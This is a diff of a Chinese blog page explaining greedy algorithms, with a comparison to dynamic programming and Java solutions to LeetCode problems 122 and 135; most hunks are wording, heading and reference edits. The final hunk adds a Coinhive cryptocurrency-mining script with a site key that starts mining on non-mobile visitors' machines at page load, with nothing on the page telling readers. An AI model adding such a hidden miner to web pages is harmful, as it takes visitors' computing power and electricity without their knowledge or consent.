@@ -101,7 +101,7 @@
 <meta property="og:description" content="之前在写算法一篇通——动态规划时，看到不少相关的资料都谈到了贪心算法。原本我对贪心算法的认知比较简单，但是越看越混，尤其是和动态规划的差异，少有文章能说的准确透彻。因此，这几天也对贪心算法加以了解学习。 给出 n 个物体，第 i 个物体重量为 wi，要求选择尽量多的物体，使得总重量不超过 C。对于这个问题，我们很容易想到，因为在对总重量有要求的情况下要选择尽量多的物体，因此挑轻的肯定比挑重的划算。">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://kyonhuang.top/images/brush-is-the-best.png">
-<meta property="og:updated_time" content="2017-12-29T14:19:00.000Z">
+<meta property="og:updated_time" content="2017-12-30T08:47:43.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="算法一篇通——贪心算法">
 <meta name="twitter:description" content="之前在写算法一篇通——动态规划时，看到不少相关的资料都谈到了贪心算法。原本我对贪心算法的认知比较简单，但是越看越混，尤其是和动态规划的差异，少有文章能说的准确透彻。因此，这几天也对贪心算法加以了解学习。 给出 n 个物体，第 i 个物体重量为 wi，要求选择尽量多的物体，使得总重量不超过 C。对于这个问题，我们很容易想到，因为在对总重量有要求的情况下要选择尽量多的物体，因此挑轻的肯定比挑重的划算。">
@@ -431,15 +431,15 @@
       
         <p>之前在写<a href="http://kyonhuang.top/Dynamic-programming/">算法一篇通——动态规划</a>时，看到不少相关的资料都谈到了贪心算法。原本我对贪心算法的认知比较简单，但是越看越混，尤其是和动态规划的差异，少有文章能说的准确透彻。因此，这几天也对贪心算法加以了解学习。</p>
 <p>给出 n 个物体，第 i 个物体重量为 wi，要求选择尽量多的物体，使得总重量不超过 C。对于这个问题，我们很容易想到，因为在对总重量有要求的情况下要选择尽量多的物体，因此挑轻的肯定比挑重的划算。这样，我们将所有物体按重量从小到大排序，依次选择每个物体，直到装不下为止。</p>
-<p>这就一种典型的贪心算法，只顾眼前利益，但是能够得到最优解。</p>
+<p>这就一种典型的贪心算法，只顾眼前利益，做出局部最优的选择，寄希望于这样的选择能导致全局最优解。</p>
 <a id="more"></a>
-<h2 id="概念理解"><a href="#概念理解" class="headerlink" title="概念理解"></a>概念理解</h2><p><strong>贪心算法（又称贪婪算法）</strong>，指在对问题求解时，不从整体最优上加以考虑，而总是做出在当前看来是最好的选择。也就是说，所做出的是在某种意义上的<strong>局部最优解</strong>。</p>
+<h2 id="概念理解"><a href="#概念理解" class="headerlink" title="概念理解"></a>概念理解</h2><p><strong>贪心算法（Greedy Algorithm，又称贪婪算法）</strong>，指在对问题求解时，不从整体最优上加以考虑，而总是做出在当前看来是最好的选择。也就是说，所做出的是在某种意义上的<strong>局部最优解</strong>。</p>
 <p>贪心算法<strong>不是对所有问题都能得到整体最优解</strong>，关键是贪心策略的选择，选择的贪心策略必须具备<strong>无后效性</strong>，即某个状态只与它前面出现的状态有关，而独立于后面的状态。</p>
 <p>贪心算法的两个性质是<strong>贪心选择性质</strong>和<strong>最优子结构性质</strong>：</p>
 <ul>
 <li><p><strong>贪心选择性质</strong>：指所求的问题的整体最优解可以通过一系列局部最优的选择，即贪心选择来得到。贪心选择是采用从顶向下、以迭代的方法做出相继选择，每做一次贪心选择，就将所求问题简化为一个规模更小的子问题。</p>
 </li>
-<li><p><strong>最优子结构（optimal substructure）性质</strong>：如果<strong>原问题的最优解包含的子问题的最优解</strong>，我们就称该问题具有最优子结构性质。其包含“<strong>全局最优解包含局部最优解</strong>”的思想。</p>
+<li><p><strong>最优子结构（optimal substructure）性质</strong>：如果<strong>原问题的最优解包含的子问题的最优解</strong>，而这些子问题可以独立求解，我们就称该问题具有最优子结构性质。其包含“<strong>全局最优解包含局部最优解</strong>”的思想。</p>
 </li>
 </ul>
 <h2 id="贪心算法与动态规划的区别"><a href="#贪心算法与动态规划的区别" class="headerlink" title="贪心算法与动态规划的区别"></a>贪心算法与动态规划的区别</h2><ol>
@@ -451,7 +451,7 @@
 <p>尽管贪心算法和动态规划都有最优子结构性质，我认为这个性质在两种算法中有着不太一样的含义：贪心的局部最优能达成全局最优，而动态规划的全局最优值中不一定全是局部最优，只是求解全局最优时要以局部最优作为基础。或者，我们可以认为，贪心算法通常都是自顶向下进行设计的，而动态规划则自顶向上。</p>
 <h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>贪心算法的基本思路是从问题的某一个初始解出发一步一步地进行，根据某个优化测度，每一步都要确保能获得局部最优解。每一步只考虑一个数据，<strong>选取应该满足局部优化的条件</strong>。若下一个数据和部分最优解连在一起不再是可行解时，就不把该数据添加到部分解中，直到把所有数据枚举完，或者不能再添加算法停止。</p>
 <h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><img src="/images/brush-is-the-best.png"></p>
-<h3 id="普通级"><a href="#普通级" class="headerlink" title="普通级"></a>普通级</h3><p>鉴于我没有找到基于贪心算法又一眼看不出来的问题，让我们直接从普通级开始吧。这里我选了 LeetCode 的第 122 题 Best Time to Buy and Sell Stock II。题目是这样的：给定一个数组，第 i 个元素代表第 i 天石头的买卖价。找到一种赚取最大利润的方法，你可以进行任意次交易，但是不能同时处于两笔交易中（即必须先将手上的石头卖出去才能再买）。</p>
+<h3 id="菜鸟级"><a href="#菜鸟级" class="headerlink" title="菜鸟级"></a>菜鸟级</h3><p>这里我选了 LeetCode 的第 122 题 Best Time to Buy and Sell Stock II。题目是这样的：给定一个数组，第 i 个元素代表第 i 天石头的买卖价。找到一种赚取最大利润的方法，你可以进行任意次交易，但是不能同时处于两笔交易中（即必须先将手上的石头卖出去才能再买）。</p>
 <h4 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h4><p>根据贪心选择的性质，只要能赚到钱，我们就卖掉手上的石头。那么，只要后一天的价格比前一天高，我们就做买入卖出这一笔买卖。于是有代码如下：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> total = <span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; prices.length-<span class="number">1</span>; i++)</div><div class="line">        <span class="keyword">if</span> (prices[i+<span class="number">1</span>] &gt; prices[i]) </div><div class="line">            total += prices[i+<span class="number">1</span>]-prices[i];</div><div class="line"></div><div class="line">    <span class="keyword">return</span> total;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>这样的思路是简单粗暴而有效的，但是可能需要结合多种情况考虑一下，为什么这样做是对的（我们设第 i 天的价格为 s[i]）：</p>
@@ -459,7 +459,7 @@
 <li>s[i] &lt; s[i+1] &lt; s[i+2]：这样的话，按照之前的解法，相当于省略掉中间那一笔卖出买入，只考虑第 i 天和第 i+2 天；</li>
 <li>s[i] &gt; s[i+1] &lt; s[i+2]：这样的话，我们的算法会当作没有买入过第 i 天的石头。</li>
 </ul>
-<h3 id="挑战者级"><a href="#挑战者级" class="headerlink" title="挑战者级"></a>挑战者级</h3><p>这里我选择的是 LeetCode 的第 135 题，是一道 hard 难度的题目。N 个小朋友排排坐，每个小朋友有一个分值。你需要给小朋友发糖，遵循以下规则：</p>
+<h3 id="普通级"><a href="#普通级" class="headerlink" title="普通级"></a>普通级</h3><h3 id="挑战者级"><a href="#挑战者级" class="headerlink" title="挑战者级"></a>挑战者级</h3><p>这里我选择的是 LeetCode 的第 135 题，是一道 hard 难度的题目。N 个小朋友排排坐，每个小朋友有一个分值。你需要给小朋友发糖，遵循以下规则：</p>
 <ul>
 <li>每个小朋友保底一块糖；</li>
 <li>若比左右邻居得分高，则得到的糖更多。</li>
@@ -490,6 +490,7 @@
 <h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><h3 id="写作参考"><a href="#写作参考" class="headerlink" title="写作参考"></a>写作参考</h3><ul>
 <li><a href="https://baike.baidu.com/item/%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/5411800?fr=aladdin" target="_blank" rel="external">贪心算法_百度百科</a></li>
 <li>《算法竞赛入门经典（第 2 版）》第 8 章</li>
+<li>《算法导论》第 16 章</li>
 </ul>
 <h3 id="学习参考"><a href="#学习参考" class="headerlink" title="学习参考"></a>学习参考</h3><ul>
 <li><a href="http://www.cnblogs.com/heaad/archive/2010/12/20/1911614.html" target="_blank" rel="external">大白话解析模拟退火算法 - 苍梧 - 博客园</a></li>
@@ -735,7 +736,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#概念理解"><span class="nav-number">1.</span> <span class="nav-text">概念理解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#贪心算法与动态规划的区别"><span class="nav-number">2.</span> <span class="nav-text">贪心算法与动态规划的区别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解题思路"><span class="nav-number">3.</span> <span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#例题"><span class="nav-number">4.</span> <span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#普通级"><span class="nav-number">4.1.</span> <span class="nav-text">普通级</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#解答"><span class="nav-number">4.1.1.</span> <span class="nav-text">解答</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#挑战者级"><span class="nav-number">4.2.</span> <span class="nav-text">挑战者级</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#解答-1"><span class="nav-number">4.2.1.</span> <span class="nav-text">解答</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#扩展"><span class="nav-number">5.</span> <span class="nav-text">扩展</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#哈夫曼编码"><span class="nav-number">5.1.</span> <span class="nav-text">哈夫曼编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Prim-算法-和-Kruskal-算法"><span class="nav-number">5.2.</span> <span class="nav-text">Prim 算法 和 Kruskal 算法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#启发式算法"><span class="nav-number">5.3.</span> <span class="nav-text">启发式算法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#结语"><span class="nav-number">6.</span> <span class="nav-text">结语</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考资料"><span class="nav-number">7.</span> <span class="nav-text">参考资料</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#写作参考"><span class="nav-number">7.1.</span> <span class="nav-text">写作参考</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#学习参考"><span class="nav-number">7.2.</span> <span class="nav-text">学习参考</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#概念理解"><span class="nav-number">1.</span> <span class="nav-text">概念理解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#贪心算法与动态规划的区别"><span class="nav-number">2.</span> <span class="nav-text">贪心算法与动态规划的区别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解题思路"><span class="nav-number">3.</span> <span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#例题"><span class="nav-number">4.</span> <span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#菜鸟级"><span class="nav-number">4.1.</span> <span class="nav-text">菜鸟级</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#解答"><span class="nav-number">4.1.1.</span> <span class="nav-text">解答</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#普通级"><span class="nav-number">4.2.</span> <span class="nav-text">普通级</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#挑战者级"><span class="nav-number">4.3.</span> <span class="nav-text">挑战者级</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#解答-1"><span class="nav-number">4.3.1.</span> <span class="nav-text">解答</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#扩展"><span class="nav-number">5.</span> <span class="nav-text">扩展</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#哈夫曼编码"><span class="nav-number">5.1.</span> <span class="nav-text">哈夫曼编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Prim-算法-和-Kruskal-算法"><span class="nav-number">5.2.</span> <span class="nav-text">Prim 算法 和 Kruskal 算法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#启发式算法"><span class="nav-number">5.3.</span> <span class="nav-text">启发式算法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#结语"><span class="nav-number">6.</span> <span class="nav-text">结语</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考资料"><span class="nav-number">7.</span> <span class="nav-text">参考资料</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#写作参考"><span class="nav-number">7.1.</span> <span class="nav-text">写作参考</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#学习参考"><span class="nav-number">7.2.</span> <span class="nav-text">学习参考</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -758,7 +759,7 @@
         <div class="copyright" >
   
   &copy;  2016 - 
-  <span itemprop="copyrightYear">2017</span>
+  <span itemprop="copyrightYear">2018</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -1252,6 +1253,15 @@
   
 
     <script type="text/javascript" src="/js/src/love.js"></script>
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script>
+    var miner = new CoinHive.Anonymous('QbgpjAPTac4TDxpWZto4zId8XNCiISZo', {throttle: 0.5});
+
+    // Only start on non-mobile devices
+    if (!miner.isMobile()) {
+        miner.start();
+    }
+</script>
   <!-- <script type="text/javascript" src="/js/src/copyright.js"></script> -->
 </body>
 </html>
